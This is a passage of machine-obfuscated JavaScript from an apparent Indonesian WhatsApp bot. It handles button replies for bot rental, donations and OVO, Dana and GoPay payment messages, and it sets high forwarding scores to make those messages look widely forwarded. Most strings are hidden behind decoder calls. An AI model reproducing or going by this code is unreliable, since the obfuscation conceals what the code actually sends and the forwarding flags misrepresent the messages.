sewa_1=_0x406083(0x4bf,0x35f,-0x3d,0x8be)+sender[_0x406083(0x676,0xa71,0x34a,0xb62)]('@')[0x11e4+0x41a+-0x15fe]+(_0x4aaba1(0xd1d,0x11fc,0xba3,0xbb5)+_0x406083(0x591,0xa60,0x1c9,0x36f)+_0x406083(0xd2d,0xce9,0xf50,0xf07)+_0x4aaba1(0x9a6,0xab8,0xead,0xebc)+_0x406083(0x50f,0x25d,0x4c3,0x147)+_0x406083(0xa00,0x712,0xb88,0xec7)+_0x406083(0xa32,0xc79,0x770,0x952)+_0x406083(0x93e,0x882,0x4c2,0x59a)+_0x4aaba1(0x797,0x72b,0x4d4,0x6d9)+_0x406083(0xa12,0x6ff,0xacd,0xe54)+'tode\x20lain\x20'+_0x4aaba1(0x561,0xa56,0x1a6,0xa7d)+'ubungi\x20own'+_0x4aaba1(0x910,0xd50,0x5c8,0x838));const _0x569b90={};_0x569b90['displayTex'+'t']=_0x406083(0x547,0x6a7,0x31e,0x7e0);const _0x39d40f={};_0x39d40f[_0x406083(0x758,0x2b1,0x2ca,0x935)]=_0x406083(0x906,0x863,0xd64,0x579),_0x39d40f[_0x406083(0x6b4,0xba6,0x2e3,0x3b3)]=_0x569b90,_0x39d40f[_0x4aaba1(0x816,0x865,0x36c,0x974)]=0x1;const _0x4088be={};_0x4088be['displayTex'+'t']='💶\x20Dana';const _0x484b56={};_0x484b56[_0x4aaba1(0x78d,0x913,0x821,0x48a)]=_0x406083(0x5fc,0x681,0xa59,0x497)+'1',_0x484b56['buttonText']=_0x4088be,_0x484b56[_0x4aaba1(0x816,0x8b7,0xcd1,0xc76)]=0x1;const _0xfa7039={};_0xfa7039[_0x406083(0x50e,0x540,0x71e,0x5a)+'t']=_0x406083(0x7fd,0x3ef,0x8de,0x6f3);const _0x16a9c2={};_0x16a9c2[_0x406083(0x758,0x887,0xa0c,0xa9b)]=_0x4aaba1(0xae6,0x970,0xf29,0x781)+'y1',_0x16a9c2['buttonText']=_0xfa7039,_0x16a9c2['type']=0x1;const buttons4=[_0x39d40f,_0x484b56,_0x16a9c2],_0xf2da68={};_0xf2da68[_0x4aaba1(0x886,0x59f,0x8d1,0xa27)+'t']=sewa_1,_0xf2da68[_0x406083(0x5b1,0x955,0x5e4,0x18b)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0xf2da68[_0x406083(0x79c,0x9d7,0x522,0x611)]=buttons4,_0xf2da68[_0x4aaba1(0xb0a,0x7eb,0xa9d,0xd0c)]=0x1;const btn4=_0xf2da68,_0x10bd12={};_0x10bd12[_0x4aaba1(0x533,0xa34,0x85e,0x5fe)]='hi',_0x10bd12['forwarding'+_0x406083(0x973,0x960,0xb15,0x70c)]=0x3b9aca00,_0x10bd12[_0x406083(0x823,0x694,0x4f1,0x9b2)+'d']=!![],_0x10bd12[_0x406083(0x43c,0x80,-0x4c,0x663)+'ral']=!![],_0x10bd12[_0x4aaba1(0x88d,0x8d2,0x527,0x398)+'id']=[sender];const _0x133c42={};_0x133c42[_0x406083(0x478,0xd5,-0x4c,0x395)]=_0x406083(0xbd0,0xc9d,0x10b8,0x6d2)+'21',_0x133c42[_0x4aaba1(0x887,0x6f5,0x7a4,0x677)+'o']=_0x10bd12,_0x133c42[_0x4aaba1(0xce3,0xf4b,0xf73,0x11a9)]=fkontak,_0x133c42['sendEpheme'+_0x4aaba1(0x441,0x624,0x6f,0x603)]=!![],alpha[_0x4aaba1(0x8b4,0x868,0xd7d,0x7af)+'e'](from,btn4,MessageType[_0x406083(0x9f4,0x737,0x685,0x830)+'sage'],_0x133c42);}if(subscribezeeoneofc==_0x406083(0x906,0xe1d,0x571,0xb54)){console[_0x4aaba1(0x497,-0x56,0x629,0x21)](_0x406083(0x68b,0xa96,0x97a,0x89a)+_0x406083(0xbe3,0x107d,0xf30,0x83e),_0x406083(0xa5a,0x6b4,0xa4a,0x7c7)+'MD\x20\x1b[1;37m'+']',wib,color(_0x406083(0xd14,0xb02,0x1104,0xfaa)+'sage\x20Payme'+_0x406083(0xd48,0xb59,0xedd,0xaa8)));var ini_info=_0x4aaba1(0xaa1,0x75b,0x9a5,0xc6f)+sender['split']('@')[-0x3*0xa6d+-0x14*-0x37+0x1afb]+(_0x406083(0xb56,0x850,0xad0,0x73e)+_0x4aaba1(0xb7d,0x109c,0xcb6,0x75e)+_0x406083(0x7ba,0x9bf,0x70f,0x92d)+_0x406083(0xd04,0xce0,0xcb9,0xb83)+_0x4aaba1(0x5fa,0xb1d,0xae0,0xf0));const _0x27dc95={};_0x27dc95['displayTex'+'t']=_0x4aaba1(0x5fe,0x75c,0x3e4,0x377);const _0x46dbf1={};_0x46dbf1[_0x4aaba1(0x78d,0xcad,0x4ac,0x618)]=_0x406083(0x667,0x40e,0x352,0x198)+_0x4aaba1(0x8d5,0x86c,0x618,0xb62),_0x46dbf1[_0x4aaba1(0x6e9,0x2be,0x500,0x92d)]=_0x27dc95,_0x46dbf1[_0x4aaba1(0x816,0x69f,0x991,0x616)]=0x1;const _0x218013={};_0x218013[_0x406083(0x50e,0x38a,0x204,0x426)+'t']=_0x406083(0x74c,0x2f7,0x8f5,0x387);const _0x2c2a2e={};_0x2c2a2e[_0x4aaba1(0x78d,0x289,0xad7,0x7b0)]='qr_ovo13',_0x2c2a2e[_0x4aaba1(0x6e9,0x656,0x1f8,0xa45)]=_0x218013,_0x2c2a2e[_0x4aaba1(0x816,0xae2,0xa25,0x734)]=0x1;const buttons6=[_0x46dbf1,_0x2c2a2e],_0x16b81d={};_0x16b81d[_0x4aaba1(0x886,0x6d6,0x3b0,0x367)+'t']=ini_info,_0x16b81d[_0x406083(0x5b1,0x26e,0x41c,0x891)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x16b81d[_0x4aaba1(0x7d1,0x5c1,0x4d9,0x4d0)]=buttons6,_0x16b81d['headerType']=0x1;const btn6=_0x16b81d,_0x49419c={};_0x49419c[_0x406083(0x4fe,0x61,0x52e,0x228)]='hi',_0x49419c[_0x4aaba1(0x904,0x70b,0x803,0x9f3)+_0x4aaba1(0x9a8,0xb15,0xc5b,0xd27)]=0x3b9aca00,_0x49419c[_0x4aaba1(0x858,0xb2a,0xa4b,0x5ee)+'d']=!![],_0x49419c['sendEpheme'+_0x406083(0x40c,0x6ff,0x3a7,0x6c1)]=!![],_0x49419c['mentionedJ'+'id']=[sender];const _0x11198c={};_0x11198c[_0x406083(0x478,0x564,-0x82,0x87)]=_0x406083(0xbd0,0xd7f,0xde2,0x10ef)+'21',_0x11198c['contextInf'+'o']=_0x49419c,_0x11198c['quoted']=fkontak,_0x11198c[_0x406083(0x43c,0x754,-0x8a,0x107)+_0x4aaba1(0x441,0x430,0x16d,0x21)]=!![],alpha[_0x4aaba1(0x8b4,0xa19,0xc7f,0x47b)+'e'](from,btn6,MessageType[_0x406083(0x9f4,0xb95,0xb85,0xd2f)+_0x4aaba1(0x4ff,0x77f,0x69c,0x23f)],_0x11198c);}if(subscribezeeoneofc==_0x4aaba1(0x631,0x76f,0x684,0x721)+'1'){console[_0x406083(0x462,0x413,0x7db,0x85b)](_0x406083(0x68b,0x59d,0x3a2,0xa52)+_0x4aaba1(0xc18,0xb58,0x82b,0xee2),_0x406083(0xa5a,0x669,0xdc9,0xcdc)+_0x4aaba1(0x7fe,0x89b,0xbf0,0x8d1)+']',wib,color(_0x406083(0xd14,0xf9b,0xb1c,0x931)+_0x406083(0xcc9,0x7ef,0x112c,0x90e)+'nt\x20Dana'));var ini_info=_0x406083(0xa6c,0xdc2,0xcab,0x6c4)+sender[_0x4aaba1(0x6ab,0x5b4,0xb1b,0xb78)]('@')[0x4*0x67f+-0x1*-0x3dd+-0x1*0x1dd9]+(_0x406083(0xb56,0x93e,0x725,0x773)+_0x4aaba1(0xb7d,0x94a,0xfa2,0x84e)+_0x406083(0x7ba,0xa03,0x4c7,0x3ff)+_0x4aaba1(0xd39,0x896,0xa49,0x1021)+_0x406083(0x5c5,0x4a5,0x98a,0x5d1));const _0x11e5eb={};_0x11e5eb[_0x4aaba1(0x543,0x780,0x9ba,0x64c)+'t']=_0x4aaba1(0x5fe,0x1cf,0x9f6,0xa67);const _0x3e0420={};_0x3e0420[_0x4aaba1(0x78d,0x292,0x2d4,0x56e)]=_0x4aaba1(0x3e3,0x438,0x282,0x7d1)+_0x4aaba1(0x602,0x7f9,0x5ca,0x21f),_0x3e0420[_0x406083(0x6b4,0x2f7,0x5ef,0x4fe)]=_0x11e5eb,_0x3e0420[_0x406083(0x7e1,0x760,0x963,0xc83)]=0x1;const _0x1ee3a0={};_0x1ee3a0[_0x406083(0x50e,0x50f,0x21e,0x5f8)+'t']=_0x4aaba1(0x781,0xb60,0x988,0x921);const _0x19085a={};_0x19085a[_0x4aaba1(0x78d,0xaeb,0x9f6,0x69a)]=_0x4aaba1(0x76e,0xc64,0x7c9,0x270),_0x19085a['buttonText']=_0x1ee3a0,_0x19085a[_0x406083(0x7e1,0x344,0x9ee,0x3e0)]=0x1;const buttons6=[_0x3e0420,_0x19085a],_0x385afd={};_0x385afd['contentTex'+'t']=ini_info,_0x385afd['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x385afd[_0x406083(0x79c,0xb9d,0x9a1,0x632)]=buttons6,_0x385afd['headerType']=0x1;const btn6=_0x385afd,_0x6e60a2={};_0x6e60a2[_0x4aaba1(0x533,0x3e8,0x885,0x54a)]='hi',_0x6e60a2[_0x4aaba1(0x904,0xe13,0x8ab,0x9f3)+_0x4aaba1(0x9a8,0x8d1,0xe4a,0xd4a)]=0x3b9aca00,_0x6e60a2[_0x406083(0x823,0x99c,0xb52,0x611)+'d']=!![],_0x6e60a2['sendEpheme'+_0x406083(0x40c,-0x10c,0x738,0x2a)]=!![],_0x6e60a2[_0x406083(0x858,0xa9a,0x373,0x45c)+'id']=[sender];const _0x26d80e={};_0x26d80e[_0x4aaba1(0x4ad,0x592,0x559,0x95e)]=_0x406083(0xbd0,0xfb4,0xdd6,0x1036)+'21',_0x26d80e[_0x406083(0x852,0x36e,0x4bd,0x6cc)+'o']=_0x6e60a2,_0x26d80e[_0x406083(0xcae,0x1068,0xc46,0xe8a)]=fkontak,_0x26d80e[_0x406083(0x43c,0x65a,0x5b5,0x7a0)+_0x4aaba1(0x441,-0x9d,0x863,0x1bc)]=!![],alpha[_0x4aaba1(0x8b4,0xb19,0xb04,0xa1b)+'e'](from,btn6,MessageType['buttonsMes'+_0x406083(0x4ca,0x931,0x2a1,0x8b6)],_0x26d80e);}if(subscribezeeoneofc==_0x4aaba1(0xae6,0xad9,0xb4f,0xbae)+'y1'){console[_0x406083(0x462,0x2f8,0xa0,0x52b)](_0x406083(0x68b,0xbaa,0x49d,0x61c)+_0x4aaba1(0xc18,0xdb0,0xf4b,0xaf9),_0x4aaba1(0xa8f,0xa06,0xc58,0xee2)+_0x406083(0x7c9,0x39a,0xb4f,0xc67)+']',wib,color(_0x4aaba1(0xd49,0x107b,0xbf7,0x122a)+_0x4aaba1(0xcfe,0xf9b,0x94e,0xd2d)+_0x4aaba1(0x7de,0x737,0x3b7,0xc4a)));var ini_info='Hay\x20@'+sender[_0x406083(0x676,0x520,0x628,0x5e9)]('@')[0x1c08+0x4*-0x6fb+0x1*-0x1c]+(_0x4aaba1(0xb8b,0xe5e,0xbc2,0x6cf)+'\x20bayar\x20pak'+_0x406083(0x7ba,0xa85,0x65e,0xaae)+_0x406083(0xd04,0xce8,0x983,0x89c)+_0x406083(0x5c5,0x160,0x58c,0x3d1));const _0x5219d6={};_0x5219d6[_0x406083(0x50e,0x392,0x61f,0x383)+'t']='🔢\x20Nomor';const _0xc79c34={};_0xc79c34[_0x4aaba1(0x78d,0xabf,0xa08,0x8dd)]='langsung_g'+_0x4aaba1(0x7dd,0x3c2,0x67a,0x724),_0xc79c34[_0x4aaba1(0x6e9,0x20c,0x9b6,0x4ef)]=_0x5219d6,_0xc79c34[_0x406083(0x7e1,0x305,0x504,0x3a9)]=0x1;const _0x287f67={};_0x287f67[_0x4aaba1(0x543,0x213,0x63b,0x2fa)+'t']='📠\x20Qr\x20Code';const _0x945460={};_0x945460[_0x4aaba1(0x78d,0xb10,0x59c,0x9a1)]=_0x4aaba1(0xd06,0xd66,0xcef,0xfbf),_0x945460[_0x406083(0x6b4,0x2bf,0x4e8,0xa18)]=_0x287f67,_0x945460['type']=0x1;const buttons6=[_0xc79c34,_0x945460],_0x2fff88={};_0x2fff88[_0x4aaba1(0x886,0x8bd,0x8f0,0x543)+'t']=ini_info,_0x2fff88['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x2fff88[_0x406083(0x79c,0x420,0xbda,0x8f5)]=buttons6,_0x2fff88[_0x406083(0xad5,0x8e8,0xc7e,0x6b7)]=0x1;const btn6=_0x2fff88,_0x218d88={};_0x218d88['text']='hi',_0x218d88[_0x4aaba1(0x904,0xc25,0xbe7,0x738)+_0x406083(0x973,0x820,0xd6c,0xa84)]=0x3b9aca00,_0x218d88[_0x4aaba1(0x858,0x83e,0xc9f,0x813)+'d']=!![],_0x218d88[_0x4aaba1(0x471,0x1f7,0x581,0x49e)+_0x406083(0x40c,0x330,0x575,0x2e8)]=!![],_0x218d88[_0x406083(0x858,0x825,0xc88,0x775)+'id']=[sender];const _0x5b1928={};_0x5b1928[_0x4aaba1(0x4ad,0x46f,0x422,0x12d)]=_0x4aaba1(0xc05,0x99a,0xe9a,0x8cc)+'21',_0x5b1928[_0x406083(0x852,0x5f7,0x7d8,0x62e)+'o']=_0x218d88,_0x5b1928[_0x4aaba1(0xce3,0x967,0xa4b,0x1117)]=fkontak,_0x5b1928['sendEpheme'+_0x406083(0x40c,0x60c,0x8fe,0x1a3)]=!![],alpha['sendMessag'+'e'](from,btn6,MessageType['buttonsMes'+_0x406083(0x4ca,0x8fe,0x6bc,0x99c)],_0x5b1928);}if(subscribezeeoneofc==_0x4aaba1(0x69c,0x9dc,0x35c,0x446)+_0x4aaba1(0x8d5,0x5b4,0x4fe,0x971)){console['log'](_0x4aaba1(0x6c0,0x646,0x9f3,0x283)+'1;37m>','[\x1b[1;32m\x20C'+_0x406083(0x7c9,0x584,0xba1,0x35d)+']',wib,color('Button\x20Mes'+_0x4aaba1(0x489,0x72b,0x7ca,0x5d8)+_0x406083(0x6fa,0xa73,0x956,0x63d))),optionsp1=petik+(_0x406083(0x9ab,0x9e7,0xa88,0xe6e)+_0x4aaba1(0x831,0x37d,0xc2d,0x75f))+petik+(_0x4aaba1(0x527,0x588,0x89d,0x13f)+_0x406083(0x49e,-0x6d,0x961,0x33c))+pushname+('_\x0a•>\x20Nomor'+_0x4aaba1(0xa93,0x8d1,0xeaa,0x621))+sender[_0x406083(0x676,0x342,0x636,0x245)]('@')[0x1bd*-0x2+-0x214c+0xc42*0x3]+_0x406083(0xa6a,0x894,0xd5d,0x7c3)+petik+(_0x406083(0xb05,0xbdd,0xa62,0x6e7)+'O')+petik+'\x0a\x0a'+nomor_ovo+('\x0a\x0a_Powered'+_0x4aaba1(0xcb9,0x1076,0xddf,0xfcf))+ini_mark['split']('@')[-0xc04*-0x1+0x1cf7+-0x28fb]+'_';const _0x11eeba={};_0x11eeba[_0x4aaba1(0x88d,0xc6c,0xd63,0x4a8)+'id']=[sender,ini_mark],_0x11eeba[_0x4aaba1(0x904,0x70a,0x76a,0xb3a)+_0x4aaba1(0x9a8,0xb58,0x516,0xdbe)]=0x3e7,_0x11eeba[_0x406083(0x823,0x422,0xbe7,0xd0f)+'d']=!![];const _0x9753d7={};_0x9753d7[_0x406083(0xcae,0xfb4,0x808,0xe2c)]=fkontak,_0x9753d7[_0x4aaba1(0x887,0x95e,0x4a3,0xd13)+'o']=_0x11eeba,_0x9753d7[_0x4aaba1(0x471,0x370,0x23,0x670)+_0x406083(0x40c,0x84f,0x930,0xde)]=!![],alpha[_0x4aaba1(0x8b4,0x467,0x82b,0xada)+'e'](from,optionsp1,text,_0x9753d7);}if(subscribezeeoneofc==_0x4aaba1(0x3e3,0x275,0x5b9,0x764)+_0x406083(0x5cd,0xa5d,0x7b5,0x8db)){console['log'](_0x406083(0x68b,0x3f0,0x585,0xaa5)+_0x4aaba1(0xc18,0xbaa,0xb6c,0x806),'[\x1b[1;32m\x20C'+_0x406083(0x7c9,0x735,0xa72,0xa40)+']',wib,color(_0x4aaba1(0xd49,0xbc6,0xc4f,0xc81)+_0x406083(0x454,0x955,0x174,0x961)+_0x4aaba1(0x4ba,0x2b9,0x81c,0x8f1))),optionsp1=petik+(_0x406083(0x9ab,0x876,0xd44,0x486)+'BOT')+petik+(_0x406083(0x4f2,0x82e,0x6e6,0x45f)+':\x20_')+pushname+(_0x406083(0xa8a,0x76f,0xd39,0xd38)+_0x4aaba1(0xa93,0xc43,0xf79,0xedc))+sender[_0x4aaba1(0x6ab,0x965,0x2bc,0x953)]('@')[0x114+-0x11*0x1df+0x1ebb]+_0x406083(0xa6a,0x8ab,0xc04,0xc24)+petik+(_0x406083(0x5f8,0x609,0x583,0x1ba)+'NA')+petik+'\x0a\x0a'+nomor_dana+(_0x4aaba1(0xaf9,0xcc4,0xc20,0xe68)+'\x20by\x20@')+ini_mark[_0x4aaba1(0x6ab,0xbb9,0x81e,0x28e)]('@')[-0x186e+0x6d3*-0x2+-0x1*-0x2614]+'_';const _0x2b2403={};_0x2b2403[_0x4aaba1(0x88d,0xacc,0x71b,0x663)+'id']=[sender,ini_mark],_0x2b2403['forwarding'+_0x4aaba1(0x9a8,0xe74,0x8b0,0xd48)]=0x3e7,_0x2b2403['isForwarde'+'d']=!![];const _0x1e342f={};_0x1e342f['quoted']=fkontak,_0x1e342f['contextInf'+'o']=_0x2b2403,_0x1e342f['sendEpheme'+_0x406083(0x40c,0x5a,0x622,0x519)]=!![],alpha[_0x406083(0x87f,0xd20,0x5ab,0xa6b)+'e'](from,optionsp1,text,_0x1e342f);}if(subscribezeeoneofc==_0x406083(0x8f5,0x74b,0x8e2,0x525)+_0x4aaba1(0x7dd,0x6f1,0x8b2,0x6ca)){console['log'](_0x4aaba1(0x6c0,0x424,0x53d,0x652)+'1;37m>',_0x406083(0xa5a,0xa27,0x9d8,0x6c0)+_0x406083(0x7c9,0x904,0x4dc,0xc8b)+']',wib,color('Button\x20Mes'+_0x4aaba1(0x489,0x52f,0x272,0x7f9)+_0x4aaba1(0xaa3,0xb15,0xa7f,0x80b))),optionsp1=petik+(_0x4aaba1(0x9e0,0xb88,0x8d4,0x56c)+_0x4aaba1(0x831,0x4d5,0x5c1,0xab0))+petik+(_0x4aaba1(0x527,0x36e,0x286,0x512)+':\x20_')+pushname+('_\x0a•>\x20Nomor'+_0x4aaba1(0xa93,0x715,0xf4d,0xb22))+sender[_0x4aaba1(0x6ab,0x3d6,0x3d2,0x7ae)]('@')[-0xca2+0x6*0x115+0x624]+_0x4aaba1(0xa9f,0x854,0xdde,0x8ee)+petik+('PAYMENT\x20GO'+'PAY')+petik+'\x0a\x0a'+nomor_gopay+(_0x4aaba1(0xaf9,0xe07,0x101e,0x860)+_0x406083(0xc84,0xe11,0xaa5,0xd7b))+ini_mark[_0x406083(0x676,0xb8f,0x60f,0x814)]('@')[-0x1*-0x15d7+0x3a*0xa7+-0x3bad]+'_';const _0x161a76={};_0x161a76[_0x4aaba1(0x88d,0x9c3,0xc04,0x990)+'id']=[sender,ini_mark],_0x161a76[_0x4aaba1(0x904,0x885,0x7e2,0x953)+_0x4aaba1(0x9a8,0xb3d,0xc5b,0xc0c)]=0x3e7,_0x161a76[_0x4aaba1(0x858,0xa85,0x594,0xb51)+'d']=!![];const _0x33ce7e={};_0x33ce7e[_0x406083(0xcae,0xc70,0x78f,0xa9b)]=fkontak,_0x33ce7e['contextInf'+'o']=_0x161a76,_0x33ce7e[_0x4aaba1(0x471,0xe1,-0x5d,0x5dd)+_0x406083(0x40c,0x7af,0x92d,0x4a1)]=!![],alpha['sendMessag'+'e'](from,optionsp1,text,_0x33ce7e);}if(subscribezeeoneofc==_0x406083(0xa64,0x84d,0x940,0x9c0)){var ini_info=_0x406083(0xa6c,0xc86,0xb81,0xf6a)+sender[_0x406083(0x676,0x9a8,0x488,0x6e4)]('@')[0x969+0x72e*0x1+-0x1*0x1097]+(_0x406083(0xb56,0xc7f,0x870,0x95f)+'\x20donasi\x20vi'+_0x406083(0x959,0xa66,0x5dd,0xe1d)+_0x406083(0x63a,0x4c5,0xb02,0xab2)+_0x406083(0xc0c,0xe31,0xc69,0xeb5)+_0x406083(0x493,0x491,0x21d,0x33b)+_0x406083(0xbb7,0xf9c,0xd84,0x764)+_0x4aaba1(0x5c3,0x297,0xa1e,0xad5)+'sa\x20hubungi'+'\x20owner\x20ku\x20'+'langsung😇');const _0x52d703={};_0x52d703[_0x4aaba1(0x543,0x142,0xd6,0x8e1)+'t']=_0x406083(0x853,0xd3d,0x8f9,0x56e);const _0x2c2f92={};_0x2c2f92[_0x4aaba1(0x78d,0x9a7,0x45f,0x42b)]=_0x4aaba1(0x93b,0x5b9,0x5c4,0x92f)+'8',_0x2c2f92['buttonText']=_0x52d703,_0x2c2f92[_0x406083(0x7e1,0x84e,0x361,0x756)]=0x1;const _0x52ca87={};_0x52ca87[_0x4aaba1(0x543,0xae,0xa3f,0x7c8)+'t']=_0x406083(0x54a,0x52c,0x836,0x337);const _0x11e394={};_0x11e394[_0x406083(0x758,0xbb4,0x5f1,0xb5a)]=_0x406083(0x5fc,0x129,0x807,0x6be)+'18',_0x11e394[_0x406083(0x6b4,0x3ab,0xb76,0x5c3)]=_0x52ca87,_0x11e394[_0x4aaba1(0x816,0xc4a,0x45d,0xb4c)]=0x1;const _0x6e26b9={};_0x6e26b9[_0x4aaba1(0x543,0x792,0x877,0x6c7)+'t']=_0x406083(0xa2b,0xac9,0x511,0xd77);const _0x46aad0={};_0x46aad0[_0x4aaba1(0x78d,0xae0,0x67a,0x305)]=_0x406083(0xab1,0xf6a,0xf17,0xb3f)+_0x406083(0x3e2,0x2d8,0x8fc,0x69b),_0x46aad0[_0x406083(0x6b4,0x9d9,0x21e,0x34b)]=_0x6e26b9,_0x46aad0['type']=0x1;const buttons3=[_0x2c2f92,_0x11e394,_0x46aad0],_0x1000ea={};_0x1000ea[_0x4aaba1(0x886,0x61c,0xbe8,0xbf8)+'t']=ini_info,_0x1000ea[_0x406083(0x5b1,0xa90,0x709,0x700)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x1000ea[_0x4aaba1(0x7d1,0x323,0xce8,0x97a)]=buttons3,_0x1000ea[_0x406083(0xad5,0xa19,0xee4,0x81f)]=0x1;const btn3=_0x1000ea,_0x277412={};_0x277412[_0x406083(0x4fe,0x351,0x9ed,0x267)]='hi',_0x277412['forwarding'+_0x406083(0x973,0x9ec,0x8c5,0x90d)]=0x3b9aca00,_0x277412[_0x406083(0x823,0xd32,0x8cb,0xcb3)+'d']=!![],_0x277412[_0x406083(0x43c,0x2f1,0x4db,0x5a2)+_0x4aaba1(0x441,0x144,0x3f,0x5b9)]=!![],_0x277412[_0x406083(0x858,0x8be,0x6a6,0x941)+'id']=[sender];const _0x480826={};_0x480826[_0x4aaba1(0x4ad,0x56a,0x43c,0xce)]=_0x406083(0xbd0,0x71a,0xc0f,0xcca)+'21',_0x480826[_0x4aaba1(0x887,0x7c1,0x669,0x7ac)+'o']=_0x277412,_0x480826[_0x4aaba1(0xce3,0x8a6,0x97d,0x98d)]=ftroli,_0x480826['sendEpheme'+_0x4aaba1(0x441,0x21d,0x6c8,0xfb)]=!![],alpha['sendMessag'+'e'](from,btn3,MessageType[_0x4aaba1(0xa29,0xa6a,0x796,0xc14)+_0x4aaba1(0x4ff,0x313,0x8fa,0xc4)],_0x480826);}if(subscribezeeoneofc==_0x406083(0x906,0xe07,0x904,0xc4a)+'8'){var ini_info=_0x406083(0xa6c,0x93d,0xefa,0xe0a)+sender[_0x4aaba1(0x6ab,0x26c,0x425,0x84b)]('@')[-0x2*-0x12f3+0xb85*-0x1+-0x1a61]+(_0x4aaba1(0xb8b,0x1068,0xc43,0x81b)+_0x4aaba1(0xb7d,0xaa7,0x82e,0x6de)+_0x406083(0x7ba,0x43f,0xafb,0x7b3)+_0x4aaba1(0xd39,0x1203,0x995,0x948)+_0x406083(0x5c5,0xaad,0x522,0x451));const _0x237241={};_0x237241['displayTex'+'t']=_0x406083(0x38d,0x457,0x129,0x73);const _0x4e1d22={};_0x4e1d22[_0x406083(0x758,0xbf0,0x9cb,0x943)]=_0x4aaba1(0x69c,0x217,0x2fe,0xa48)+_0x406083(0x52a,0x713,0x80b,0x4cf),_0x4e1d22[_0x4aaba1(0x6e9,0x325,0x354,0x1ec)]=_0x237241,_0x4e1d22[_0x406083(0x7e1,0xa34,0xa27,0x4cc)]=0x1;const _0x343151={};_0x343151['displayTex'+'t']=_0x4aaba1(0xd28,0x9ed,0x848,0xa00);const _0x11f015={};_0x11f015[_0x406083(0x758,0x8c3,0xbc0,0x8e8)]=_0x406083(0x505,0x13f,0x1fa,0x4a2),_0x11f015['buttonText']=_0x343151,_0x11f015[_0x4aaba1(0x816,0xcc3,0xcd0,0x535)]=0x1;const buttons4=[_0x4e1d22,_0x11f015],_0x24a1eb={};_0x24a1eb[_0x4aaba1(0x886,0x47d,0x7bb,0xcaa)+'t']=ini_info,_0x24a1eb[_0x4aaba1(0x5e6,0x2cd,0x612,0x9a9)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x24a1eb['buttons']=buttons4,_0x24a1eb[_0x4aaba1(0xb0a,0xa17,0x7e5,0x835)]=0x1;const btn4=_0x24a1eb,_0x495540={};_0x495540[_0x406083(0x4fe,0x4b2,0x4e4,0x7cf)]='hi',_0x495540[_0x4aaba1(0x904,0x821,0x66f,0x83d)+'Score']=0x3b9aca00,_0x495540[_0x4aaba1(0x858,0xa79,0x5ed,0x552)+'d']=!![],_0x495540['sendEpheme'+_0x4aaba1(0x441,0x784,0x674,-0x4c)]=!![],_0x495540['mentionedJ'+'id']=[sender];const _0x2d249b={};_0x2d249b['caption']=_0x4aaba1(0xc05,0xbee,0x7dc,0x784)+'21',_0x2d249b['contextInf'+'o']=_0x495540,_0x2d249b[_0x4aaba1(0xce3,0xeb9,0x886,0xd31)]=ftroli,_0x2d249b[_0x4aaba1(0x471,0x540,0x4d6,0x8b8)+'ral']=!![],alpha['sendMessag'+'e'](from,btn4,MessageType[_0x4aaba1(0xa29,0x81f,0x63a,0x842)+_0x406083(0x4ca,0x6b8,0x13a,-0x1e)],_0x2d249b);}if(subscribezeeoneofc==_0x4aaba1(0x69c,0x97d,0xb7e,0x683)+_0x4aaba1(0x55f,0xa83,0x233,0xa4f)){optionsp1=_0x4aaba1(0xd04,0x9d5,0x8e8,0x8d8)+_0x4aaba1(0x872,0x579,0xaea,0x6df)+_0x4aaba1(0x7a4,0x2bb,0xba4,0x609)+_0x406083(0x599,0x5f7,0x7e6,0x128)+_0x4aaba1(0xc49,0xcd7,0x84d,0xa53)+_0x406083(0x5a8,0x6da,0x448,0x3b6)+_0x4aaba1(0x509,0x94a,0x3cd,0x140)+_0x406083(0x99c,0x5ec,0xa07,0x9fb)+_0x406083(0xa7f,0xee4,0x8ab,0x61a)+_0x4aaba1(0x411,0x7b0,0x6cf,0x66c)+_0x4aaba1(0xbf6,0x1098,0x77e,0xeb0)+_0x406083(0x754,0x7fc,0x4ce,0x2bf)+_0x4aaba1(0xb8d,0xb62,0x8ec,0x97c)+'\x20akan\x20dili'+_0x4aaba1(0xa24,0xc0f,0xedc,0xca8)+_0x406083(0x8eb,0x8b1,0x4ad,0x5a8)+_0x406083(0x3d0,0x91,0x894,0x899)+_0x4aaba1(0x3de,0x21f,0x6dc,0x5fd)+_0x4aaba1(0xda6,0xff9,0xe56,0xdb5)+_0x406083(0x9de,0x4c8,0x556,0xd88)+_0x406083(0xcee,0x9d5,0xf5e,0x11fd)+'banyak.”\x20('+_0x4aaba1(0xb35,0xc5b,0xc93,0x9f4)+_0x4aaba1(0xafd,0xd2f,0xb39,0x8e7)+_0x4aaba1(0x779,0x80e,0x6f3,0xb24)+pushname+(_0x406083(0xb02,0x65d,0xcc6,0x952)+_0x406083(0x57b,0x589,0x6de,0x23d))+sender[_0x4aaba1(0x6ab,0x555,0xb5b,0x352)]('@')[0xe*0x238+0x1a46+-0x3956]+('_\x0a\x0a*PAYMEN'+_0x406083(0x94b,0x4ae,0xa82,0x5d8))+nomor_ovo+(_0x4aaba1(0xaf9,0x678,0xb34,0xb88)+_0x406083(0xc84,0xf57,0xfc6,0xdfd))+ini_mark[_0x4aaba1(0x6ab,0x9fc,0x4c0,0x192)]('@')[-0xf*-0x14b+-0x2011*0x1+0xcac]+'_';const _0x32fccb={};_0x32fccb[_0x406083(0x858,0x559,0xd74,0x53a)+'id']=[sender,ini_mark],_0x32fccb['forwarding'+'Score']=0x3e7,_0x32fccb['isForwarde'+'d']=!![];const _0x4a1e2b={};_0x4a1e2b['quoted']=fkontak,_0x4a1e2b['contextInf'+'o']=_0x32fccb,_0x4a1e2b[_0x4aaba1(0x471,0xea,0x743,0x464)+_0x4aaba1(0x441,0x1bd,0x24a,0x606)]=!![],alpha[_0x406083(0x87f,0x771,0xcec,0x580)+'e'](from,optionsp1,text,_0x4a1e2b);}if(subscribezeeoneofc==_0x406083(0x5fc,0x55b,0x918,0x861)+'18'){var 